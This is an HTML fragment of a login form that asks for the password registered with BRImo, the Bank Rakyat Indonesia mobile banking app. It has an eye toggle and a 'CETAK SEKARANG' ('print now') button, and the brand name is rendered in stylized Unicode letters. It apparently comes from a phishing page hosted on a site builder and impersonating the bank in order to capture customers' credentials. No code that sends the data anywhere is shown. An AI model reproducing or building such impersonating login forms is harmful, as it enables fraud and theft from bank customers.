...
<input name="pass" id="pass" type="password" class="bubble-element Input" placeholder="Password" maxlength="" style="border-radius: ; margin-top: 60px"  pattern="(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]).{8,}" title="Masukan Data yang terdaftar di 𝗕𝗥𝗜𝗺𝗼 anda"  required>
<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                        ...
                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                            <ion-icon name="eye" id="eye"></ion-icon>
                                       ...
                                       <button id="btnsubmit" disabled class="btn-login" type="submit">CETAK SEKARANG</button>
                                       <center>
